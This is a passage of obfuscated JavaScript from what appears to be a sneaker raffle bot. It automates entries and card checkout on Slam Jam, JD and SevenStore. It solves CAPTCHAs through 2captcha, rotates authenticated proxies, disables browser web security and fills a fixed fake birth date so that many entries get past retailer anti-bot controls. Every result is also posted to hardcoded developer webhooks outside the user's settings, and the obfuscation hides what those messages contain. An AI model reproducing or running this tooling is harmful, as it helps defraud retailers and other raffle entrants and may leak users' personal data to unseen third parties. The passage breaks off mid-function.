                await _0x3d0343['waitForSelector']('.nav-account'), await _0x30926a(0x4b0);
            } catch {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x568995['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x3d0343['goto']('' + _0x5c42fe[_0x36ee02]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x30926a(0xbb8), console['log'](_0x31f3f5() + '\x20[' + _0x568995['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x3d0343['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
            await _0x3d0343['click']('.product-select-variant-wrapper'), await _0x30926a(0x320), await _0x3d0343['click']('li.product-select-variant__value[data-size=\x22' + _0x5c42fe[_0x36ee02]['Size'] + '\x22]'), await _0x30926a(0x384), await _0x3d0343['$eval']('#AddToCartForm-product-template-raffle', _0x387df1 => _0x387df1['submit']()), await _0x3d0343['waitForSelector']('.cart-order-summary__content'), await _0x30926a(0x514), await _0x3d0343['goto']('https://drop.slamjam.com/checkout'), await _0x30926a(0x514), await _0x3d0343['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x31f3f5() + '\x20[' + _0x568995['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3d0343['select']('#checkout_shipping_address_country', '' + _0x5c42fe[_0x36ee02]['Country']), await _0x30926a(0x200), await _0x3d0343['waitForSelector']('#checkout_shipping_address_first_name'), await _0x3d0343['type']('#checkout_shipping_address_first_name', '' + _0x5c42fe[_0x36ee02]['FirstName']), await _0x30926a(0x237), await _0x3d0343['type']('#checkout_shipping_address_last_name', '' + _0x5c42fe[_0x36ee02]['LastName']), await _0x30926a(0x1e0), await _0x3d0343['type']('#checkout_shipping_address_address1', _0x5c42fe[_0x36ee02]['Address1'] + '\x20' + _0x5c42fe[_0x36ee02]['HouseNumber']), await _0x30926a(0x514), await _0x3d0343['type']('#checkout_shipping_address_address2', '' + _0x5c42fe[_0x36ee02]['Address2']), await _0x30926a(0x514);
            _0x5c42fe[_0x36ee02]['Postcode'] == undefined && (_0x5c42fe[_0x36ee02]['Postcode'] = _0x5c42fe[_0x36ee02]['Zip']);
            await _0x3d0343['type']('#checkout_shipping_address_zip', '' + _0x5c42fe[_0x36ee02]['Postcode']), await _0x30926a(0x2bc), await _0x3d0343['type']('#checkout_shipping_address_city', '' + _0x5c42fe[_0x36ee02]['City']), await _0x30926a(0x320), await _0x3d0343['type']('#checkout_shipping_address_phone', '' + _0x5c42fe[_0x36ee02]['Phone']), await _0x30926a(0x320), await _0x3d0343['click']('#continue_button'), await _0x30926a(0xbb8), await _0x3d0343['waitForSelector']('.summary-title'), await _0x30926a(0x320), await _0x3d0343['click']('#continue_button'), await _0x30926a(0x320), console['log'](_0x31f3f5() + '\x20[' + _0x568995['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x3d0343['waitForSelector']('#checkout_credit_card_vault'), await _0x30926a(0x3e8);
            var _0x5ec695 = await _0x3d0343['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x558f70 = await _0x5ec695['contentFrame']();
            await _0x558f70['click']('#number'), await _0x30926a(0x3e8), await _0x558f70['type']('#number', '' + _0x5c42fe[_0x36ee02]['CardNumber'], { 'delay': 0x78 }), _0x5ec695 = await _0x3d0343['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x558f70 = await _0x5ec695['contentFrame'](), await _0x30926a(0x1c2), await _0x558f70['click']('#name'), await _0x30926a(0x1f4), await _0x558f70['type']('#name', '' + _0x5c42fe[_0x36ee02]['NameOnCard'], { 'delay': 0x78 }), _0x5ec695 = await _0x3d0343['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x558f70 = await _0x5ec695['contentFrame'](), await _0x30926a(0x1c2), await _0x558f70['click']('#expiry'), await _0x30926a(0x1f4), await _0x558f70['type']('#expiry', '' + _0x5c42fe[_0x36ee02]['ExpiryDate'], { 'delay': 0x78 }), _0x5ec695 = await _0x3d0343['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x558f70 = await _0x5ec695['contentFrame'](), await _0x30926a(0x1c2), await _0x558f70['click']('#verification_value'), await _0x30926a(0x1f4), await _0x558f70['type']('#verification_value', '' + _0x5c42fe[_0x36ee02]['CVV'], { 'delay': 0x78 }), await _0x3d0343['$eval']('#accepts-flag-raffle', _0xf97600 => _0xf97600['click']()), await _0x30926a(0x7d0), console['log'](_0x31f3f5() + '\x20[' + _0x568995['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x3d0343['$eval']('#continue_button', _0x168193 => _0x168193['click']()), await _0x30926a(0x1b58), await _0x3d0343['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x3d0343['$eval']('.edit_checkout.animate-floating-labels', _0x552ca5 => _0x552ca5['submit']()), await _0x30926a(0x7d0);
            try {
                await _0x3d0343['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0xd29e04 = 'no', _0x2989d8(_0x5c42fe[_0x36ee02], _0x568995), console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x568995['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x430522) {
                throw new Error('Error\x20Processing\x20Order:\x20' + _0x430522['message']);
            }
            var _0x1cdd8c = await _0x51c110(_0x5c42fe[_0x36ee02], _0x568995, 'dev', ![]), _0xbed06c = await _0x51c110(_0x5c42fe[_0x36ee02], _0x568995, 'pub', ![]);
            const _0x482ac5 = {
                'succesDEVMSG': { 'embeds': [_0x1cdd8c] },
                'succesPUBMSG': { 'embeds': [_0xbed06c] }
            };
            try {
                _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x482ac5['succesDEVMSG']), await _0x30926a(0xc8), await _0x5778ae(_0x580ee6, _0x482ac5['succesDEVMSG']), await _0x30926a(0xc8), await _0x5778ae(_0xb27635, _0x482ac5['succesPUBMSG']);
            } catch (_0x2550e9) {
                console['log'](_0x471d3f['yellow'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2550e9));
            }
        } catch (_0x14dc7f) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20' + _0x14dc7f)), _0x2646a3 = '' + _0x14dc7f;
            var _0x5bf419 = await _0x51c110(kickz[_0x36ee02], _0x568995, 'dev', !![], _0x2646a3);
            EMBEDS['errorDEV'] = { 'embeds': [_0x5bf419] }, _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], EMBEDS['errorDEV']), await _0x5778ae(_0xc30fae, EMBEDS['errorDEV']), _0xd29e04 = 'yes';
        } finally {
            _0x507692 && _0x507692['close']();
            if (_0xd29e04 == 'yes' && _0x3b09dd != 0x5 && _0x2646a3 != 'Size\x20Not\x20Found') {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x568995['name'] + ']\x20Task\x20' + (_0x36ee02 + 0x1) + '\x20:\x20Retrying')), _0x36ee02 = _0x36ee02 - 0x1, _0x3b09dd = _0x3b09dd + 0x1;
                continue;
            }
            _0xd29e04 == 'yes' && _0x3b09dd >= 0x5 && (_0x3c82b6(_0x5c42fe[_0x36ee02], _0x568995), _0xd29e04 = 'no', _0x3b09dd = 0x0), console['log']('Waiting\x20for\x20' + _0x1ca3b9['delay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['delay']);
        }
    }
}
async function _0x1e7f2a(_0x3f35da, _0x273865, _0x41f6c4) {
    var _0x192b6c = ![], _0x56f3ff = ![];
    if (_0x1ca3b9['captchaKey'] == '' || _0x1ca3b9['captchaKey'] == undefined)
        return console['log'](_0x471d3f['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x31f277 = 0x0; _0x31f277 < _0x273865['length']; _0x31f277++) {
        if (_0x1b3fed != 'yes')
            var _0x1b3fed = '', _0x148fa3 = 0x0;
        var _0x25082d, _0x5f3ed2 = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0x273865[_0x31f277]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x273865[_0x31f277]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0x3566aa
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x1ca3b9['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x531a7c
                }
            ]
        }];
        const _0x4496fe = { 'embeds': _0x5f3ed2 };
        _0x359416(_0x3f35da['name'] + '\x20Task\x20' + (_0x31f277 + 0x1) + '\x20/\x20' + _0x273865['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847), await _0x44956d(_0x273865, _0x31f277);
        var _0x38da04 = await _0x51c110(_0x273865[_0x31f277], _0x3f35da, 'dev', ![]), _0x23d894 = await _0x51c110(_0x273865[_0x31f277], _0x3f35da, 'pub', ![]);
        const _0x32f5e1 = {
            'succesDEVMSG': { 'embeds': [_0x38da04] },
            'succesPUBMSG': { 'embeds': [_0x23d894] }
        };
        if (_0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '')
            try {
                await _0x5778ae(_0x1ca3b9['webhook'], _0x32f5e1['succesDEVMSG']);
            } catch {
            }
        await _0x30926a(0xc8), await _0x5778ae(_0x580ee6, _0x32f5e1['succesDEVMSG']), await _0x30926a(0xc8);
        try {
            await _0x5778ae(_0xb27635, _0x32f5e1['succesPUBMSG']);
        } catch {
        }
        if (_0x273865[_0x31f277]['Email'] == '' || _0x273865[_0x31f277]['Url'] == '' || _0x273865[_0x31f277]['FirstName'] == '' || _0x273865[_0x31f277]['LastName'] == '') {
            console['log'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Task\x20' + (_0x31f277 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x1ca3b9['useRandomProxy'] = ![])
            var _0x3db852 = _0x41f6c4[_0x31f277]['split'](':');
        else
            var _0x1f7b6c = Math['round'](Math['random']() * (_0x41f6c4['length'] - 0x1)), _0x3db852 = _0x41f6c4[_0x1f7b6c]['split'](':');
        const _0x4db669 = await _0x53a2e2['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3db852[0x0] + ':' + _0x3db852[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x55ea5b = await _0x4db669['newPage']();
            await _0x55ea5b['authenticate']({
                'username': '' + _0x3db852[0x2],
                'password': '' + _0x3db852[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0x3f35da['name'] + ']\x20Task\x20' + (_0x31f277 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x55ea5b['setRequestInterception'](!![]), _0x55ea5b['on']('request', _0x15a530 => {
                _0x15a530['resourceType']() === 'image' || _0x15a530['resourceType']() === 'font' || _0x15a530['resourceType']() === 'media' ? _0x15a530['abort']() : _0x15a530['continue']();
            }), await _0x55ea5b['goto']('' + _0x273865[_0x31f277]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0x55ea5b['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
            console['log'](_0x31f3f5() + '\x20[' + _0x3f35da['name'] + ']\x20Task\x20' + (_0x31f277 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x55ea5b['type']('#comp_firstname', '' + _0x273865[_0x31f277]['FirstName']), await _0x55ea5b['waitForSelector']('#comp_lastname'), await _0x55ea5b['type']('#comp_lastname', '' + _0x273865[_0x31f277]['LastName']), await _0x55ea5b['waitForSelector']('#comp_email'), await _0x55ea5b['type']('#comp_email', '' + _0x273865[_0x31f277]['Email']), await _0x55ea5b['waitForSelector']('#comp_paypalemail'), await _0x55ea5b['type']('#comp_paypalemail', '' + _0x273865[_0x31f277]['Email']), await _0x55ea5b['waitForSelector']('#comp_mobile_end'), await _0x55ea5b['type']('#comp_mobile_end', '' + _0x273865[_0x31f277]['Phone']), await _0x55ea5b['waitForSelector']('#comp_dob'), await _0x55ea5b['type']('#comp_dob', '08/09/1992'), console['log'](_0x31f3f5() + '\x20[' + _0x3f35da['name'] + ']\x20Task\x20' + (_0x31f277 + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0x273865[_0x31f277]['Size'] == 'RANDOM') {
                const _0x37e579 = await _0x55ea5b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3d4dd8 => {
                    return _0x3d4dd8['map'](_0x541992 => _0x541992['value']);
                });
                var _0xffe735 = Math['round'](Math['random']() * (_0x37e579['length'] - 0x2));
                await _0x55ea5b['select']('#shoesize', _0x37e579[_0xffe735 + 0x1]), await _0x30926a(0x3e8);
            } else {
                const _0x52accb = await _0x55ea5b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3c4383 => {
                    return _0x3c4383['map'](_0x1833e6 => _0x1833e6['innerText']);
                }), _0x2848a8 = await _0x55ea5b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2509fb => {
                    return _0x2509fb['map'](_0x5e94a9 => _0x5e94a9['value']);
                });
                var _0x375f49 = _0x273865[_0x31f277]['Size'];
                for (var _0xed0414 = 0x1; _0xed0414 < _0x2848a8['length']; _0xed0414++) {
                    var _0x41b4f0 = _0x52accb[_0xed0414]['split']('\x20')[0x0];
                    if (_0x41b4f0 == _0x375f49) {
                        await _0x55ea5b['select']('#shoesize', _0x2848a8[_0xed0414]);
                        break;
                    } else {
                        if (_0xed0414 + 0x1 == _0x2848a8['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
            await _0x55ea5b['waitForSelector']('#comp_address1'), await _0x55ea5b['type']('#comp_address1', _0x273865[_0x31f277]['Address1'] + '\x20' + _0x273865[_0x31f277]['HouseNumber']), await _0x55ea5b['waitForSelector']('#comp_address2'), await _0x55ea5b['type']('#comp_address2', '' + _0x273865[_0x31f277]['Address2']), await _0x55ea5b['waitForSelector']('#comp_address2'), await _0x55ea5b['type']('#comp_address3', '' + _0x273865[_0x31f277]['City']), await _0x55ea5b['waitForSelector']('#comp_postcode'), await _0x55ea5b['type']('#comp_postcode', '' + _0x273865[_0x31f277]['Zip']), console['log'](_0x31f3f5() + '\x20[' + _0x3f35da['name'] + ']\x20Task\x20' + (_0x31f277 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x30926a(0x4b0), await _0x55ea5b['click']('label#emailhold'), await _0x30926a(0x5dc), await _0x55ea5b['click']('#preauth_tandc_email\x20>\x20label'), await _0x30926a(0x5dc), await _0x55ea5b['click']('#submit'), await _0x55ea5b['waitForSelector']('#paymentWrap'), console['log'](_0x31f3f5() + '\x20[' + _0x3f35da['name'] + ']\x20Task\x20' + (_0x31f277 + 0x1) + '\x20:\x20' + _0x471d3f['blue']('Awaiting\x20Paypal\x20Payment')), _0x4db669['on']('targetcreated', async _0x4f2357 => {
                if (_0x4f2357['type']() === 'page') {
                    const _0x3c1802 = await _0x4f2357['page']();
                    async function _0x407722() {
                        try {
                            await _0x55ea5b['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x56f3ff = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x51b594() {
                        try {
                            await _0x55ea5b['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x192b6c = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x51b594(), _0x407722(), await _0x30926a(0x493e0);
                }
            });
            async function _0x1d2eb2() {
                for (let _0x26071c = 0x0; _0x26071c < 0x12c; _0x26071c++) {
                    if (_0x192b6c == !![]) {
                        _0x1b3fed = 'no', _0x2989d8(_0x273865[_0x31f277], _0x3f35da), console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x3f35da['name'] + ']\x20Task\x20' + (_0x31f277 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '')
                            try {
                                await _0x5778ae(_0x1ca3b9['webhook'], _0x32f5e1['succesDEVMSG']);
                            } catch {
                            }
                        await _0x30926a(0xc8), await _0x5778ae(_0x580ee6, _0x32f5e1['succesDEVMSG']), await _0x30926a(0xc8);
                        try {
                            await _0x5778ae(_0xb27635, _0x32f5e1['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0x56f3ff)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0x30926a(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0x30926a(0xbb8), await _0x55ea5b['click']('.zoid-outlet'), await _0x30926a(0x7d0), await _0x1d2eb2();
        } catch (_0x3a2eaa) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x3f35da['name'] + ']\x20Task\x20' + (_0x31f277 + 0x1) + '\x20:\x20' + _0x3a2eaa)), _0x25082d = '' + _0x3a2eaa;
            var _0x310d94 = await _0x51c110(_0x273865[_0x31f277], _0x3f35da, 'dev', !![], _0x25082d);
            _0x32f5e1['errorDEV'] = { 'embeds': [_0x310d94] }, _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x32f5e1['errorDEV']), await _0x5778ae(_0xc30fae, _0x32f5e1['errorDEV']);
        } finally {
            _0x4db669 && _0x4db669['close']();
            if (_0x1b3fed == 'yes' && _0x148fa3 != 0x5 && _0x25082d != 'Size\x20Not\x20Found') {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x3f35da['name'] + ']\x20Task\x20' + (_0x31f277 + 0x1) + '\x20:\x20Retrying')), _0x31f277 = _0x31f277 - 0x1, _0x148fa3 = _0x148fa3 + 0x1;
                continue;
            }
            _0x1b3fed == 'yes' && _0x148fa3 >= 0x5 && (_0x3c82b6(afew[_0x31f277], _0x3f35da), _0x1b3fed = 'no', _0x148fa3 = 0x0), console['log']('Waiting\x20for\x20' + _0x1ca3b9['delay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['delay']);
        }
    }
}
async function _0x3ceaae(_0x399f27, _0x163891, _0x25ea76) {
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xc16aaa = 0x0; _0xc16aaa < _0x163891['length']; _0xc16aaa++) {
        _0x359416(_0x399f27['name'] + '\x20Task\x20' + (_0xc16aaa + 0x1) + '\x20/\x20' + _0x163891['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847);
        var _0x533155 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x3566aa
                },
                {
                    'name': 'Product',
                    'value': '' + _0x163891[_0xc16aaa]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x163891[_0xc16aaa]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x1ca3b9['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x1ca3b9['version']
                }
            ]
        }];
        const _0x12298c = { 'embeds': _0x533155 };
        await _0x44956d(_0x163891, _0xc16aaa);
        if (_0x163891[_0xc16aaa]['Email'] == '' || _0x163891[_0xc16aaa]['Password'] == '' || _0x163891[_0xc16aaa]['FirstName'] == '' || _0x163891[_0xc16aaa]['LastName'] == '') {
            console['log'](_0x31f3f5() + '\x20[' + _0x399f27['name'] + ']\x20Task\x20' + (_0xc16aaa + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x163891[_0xc16aaa]['Password'] == '' || _0x163891[_0xc16aaa]['Password'] == undefined) && (_0x163891[_0xc16aaa]['Password'] = 'ErehsaWonRaj1!');
        if (_0x1ca3b9['useRandomProxy'] = ![])
            var _0x4d59ca = _0x25ea76[_0xc16aaa]['split'](':');
        else
            var _0x15ad69 = Math['round'](Math['random']() * (_0x25ea76['length'] - 0x1)), _0x4d59ca = _0x25ea76[_0x15ad69]['split'](':');
        const _0x2fee9c = await _0x53a2e2['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x4d59ca[0x0] + ':' + _0x4d59ca[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x221340 = await _0x2fee9c['newPage']();
            await _0x221340['authenticate']({
                'username': '' + _0x4d59ca[0x2],
                'password': '' + _0x4d59ca[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0x399f27['name'] + ']\x20Task\x20' + (_0xc16aaa + 0x1) + '\x20:\x20Getting\x20Session'), await _0x221340['setRequestInterception'](!![]), _0x221340['on']('request', _0xbcfd87 => {
                _0xbcfd87['resourceType']() === 'image' || _0xbcfd87['resourceType']() === 'font' || _0xbcfd87['resourceType']() === 'media' ? _0xbcfd87['abort']() : _0xbcfd87['continue']();
            }), await _0x221340['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x221340['goto']('' + _0x163891[_0xc16aaa]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x221340['waitForSelector']('#btnPdpAtb'), console['log'](_0x31f3f5() + '\x20[' + _0x399f27['name'] + ']\x20Task\x20' + (_0xc16aaa + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x163891[_0xc16aaa]['Size']);
            const _0x576fae = await _0x221340['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x228416 => {
                return _0x228416['map'](_0x18fa6f => _0x18fa6f['innerText']);
            }), _0x7f47c0 = await _0x221340['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x41cd1b = ![];
            if (_0x163891[_0xc16aaa]['Size'] == 'RANDOM') {
                var _0x1ae176 = Math['round'](Math['random']() * (_0x7f47c0['length'] - 0x1));
                await _0x7f47c0[_0x1ae176]['click']();
            } else
                for (var _0x5543d0 = 0x0; _0x5543d0 < _0x576fae['length']; _0x5543d0++) {
                    if (_0x576fae[_0x5543d0] != _0x163891[_0xc16aaa]['Size'])
                        continue;
                    try {
                        await _0x7f47c0[_0x5543d0]['click']();
                    } catch {
                        console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x399f27['name'] + ']\x20Task\x20' + (_0xc16aaa + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x41cd1b = !![];
                    }
                }
            if (_0x41cd1b)
                continue;
            await _0x30926a(0x578), await _0x221340['click']('#btnPdpAtb'), await _0x221340['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x30926a(0x3e8), console['log'](_0x31f3f5() + '\x20[' + _0x399f27['name'] + ']\x20Task\x20' + (_0xc16aaa + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x221340['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x221340['waitForSelector']('#email'), await _0x221340['type']('#email', _0x163891[_0xc16aaa]['Email']), await _0x30926a(0x226), await _0x221340['click']('#guest-submit'), await _0x30926a(0x1b58), console['log'](_0x31f3f5() + '\x20[' + _0x399f27['name'] + ']\x20Task\x20' + (_0xc16aaa + 0x1) + '\x20:\x20Filling\x20Information'), await _0x221340['waitForSelector']('#firstname'), await _0x221340['type']('#firstname', _0x163891[_0xc16aaa]['FirstName'], 0x1f4), await _0x30926a(0x190), await _0x221340['waitForSelector']('#surname'), await _0x221340['type']('#surname', _0x163891[_0xc16aaa]['LastName'], 0x1f4), await _0x30926a(0x190), await _0x221340['waitForSelector']('#mobile'), await _0x221340['type']('#mobile', _0x163891[_0xc16aaa]['Phone'], 0x1f4), await _0x30926a(0x190), await _0x221340['click']('#enterManualDiv'), await _0x30926a(0x5dc), await _0x221340['waitForSelector']('#address1'), await _0x221340['type']('#address1', _0x163891[_0xc16aaa]['Address1'] + '\x20' + _0x163891[_0xc16aaa]['HouseNumber'], 0x226), await _0x30926a(0x384), await _0x221340['waitForSelector']('#address2'), await _0x221340['type']('#address2', '' + _0x163891[_0xc16aaa]['Address2'], 0x226), await _0x30926a(0x320);
            const _0xf5c1d5 = await _0x221340['$$eval']('#countryselect_view3\x20>\x20option', _0x2af29e => {
                return _0x2af29e['map'](_0x3f4782 => _0x3f4782['value']);
            });
            var _0x5288b5;
            for (var _0x19d8c9 = 0x0; _0x19d8c9 < _0xf5c1d5['length']; _0x19d8c9++) {
                if (_0xf5c1d5[_0x19d8c9]['startsWith']('' + _0x163891[_0xc16aaa]['Country'])) {
                    _0x5288b5 = _0xf5c1d5[_0x19d8c9];
                    break;
                }
                continue;
            }
            await _0x221340['select']('#countryselect_view3', '' + _0x5288b5), await _0x221340['waitForSelector']('#address4'), await _0x221340['type']('#address4', '' + _0x163891[_0xc16aaa]['City'], 0x1f4), await _0x30926a(0x384), await _0x221340['waitForSelector']('#postcode'), await _0x221340['type']('#postcode', '' + _0x163891[_0xc16aaa]['Zip'], 0x1f4), await _0x30926a(0x4b0);
            const _0x470fb6 = await _0x221340['url']();
            console['log'](_0x31f3f5() + '\x20[' + _0x399f27['name'] + ']\x20Task\x20' + (_0xc16aaa + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x745ff = _0x470fb6['split']('?')[0x1], _0x512941 = await _0x221340['$']('#co_address_submit');
            await _0x512941['evaluate'](_0x377d88 => _0x377d88['click']()), await _0x30926a(0x1388), await _0x221340['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x745ff), console['log'](_0x31f3f5() + '\x20[' + _0x399f27['name'] + ']\x20Task\x20' + (_0xc16aaa + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x221340['waitForSelector']('#paymentbuttons'), await _0x30926a(0x1388), await _0x221340['click']('#paymentbuttons\x20>\x20div'), await _0x30926a(0x1c2), await _0x221340['waitForSelector']('#card-number'), await _0x221340['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x1cd2b8 = await _0x221340['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x9ec716 = await _0x1cd2b8['contentFrame']();
            await _0x9ec716['waitForSelector']('.InputContainer'), await _0x9ec716['click']('.InputContainer\x20>\x20input'), await _0x30926a(0x578), await _0x221340['type']('#card-number', '' + _0x163891[_0xc16aaa]['CreditNumber']), await _0x30926a(0xfa), await _0x221340['type']('#card-expiry', '' + _0x163891[_0xc16aaa]['ExpiryDate']), await _0x30926a(0xfa), await _0x221340['type']('#card-cvc', '' + _0x163891[_0xc16aaa]['CVV']), await _0x30926a(0x7d0), await _0x221340['click']('#card-button'), console['log'](_0x31f3f5() + '\x20[' + _0x399f27['name'] + ']\x20Task\x20' + (_0xc16aaa + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x221340['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x399f27['name'] + ']\x20Task\x20' + (_0xc16aaa + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x5778ae(_0x580ee6, _0x12298c);
            } catch {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x399f27['name'] + ']\x20Task\x20' + (_0xc16aaa + 0x1) + '\x20:\x203DS\x20Failed')), _0x533155[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x533155[0x0]['description'] = '3DS\x20Failed', await _0x5778ae(_0xc30fae, _0x12298c);
            }
        } catch (_0x73848c) {
            console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x399f27['name'] + ']\x20Task\x20' + (_0xc16aaa + 0x1) + '\x20:\x20' + _0x73848c)), _0x533155[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x533155[0x0]['description'] = '' + _0x73848c, await _0x5778ae(_0xc30fae, _0x12298c);
        } finally {
            _0x2fee9c && _0x2fee9c['close']();
            if (_0xc16aaa + 0x1 == _0x163891['length']) {
                console['log'](_0x471d3f['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x30926a(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x1ca3b9['AfewDelay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['AfewDelay']);
        }
    }
}
async function _0x2091e0(_0x47add4, _0x3b956a, _0x4056cf, _0x598e14, _0x4178c5) {
    var _0x5c4776, _0x4cd246 = {}, _0xe5a6df = [], _0x62064e = {}, _0x3ab937 = [
        '40',
        '40,5',
        '41',
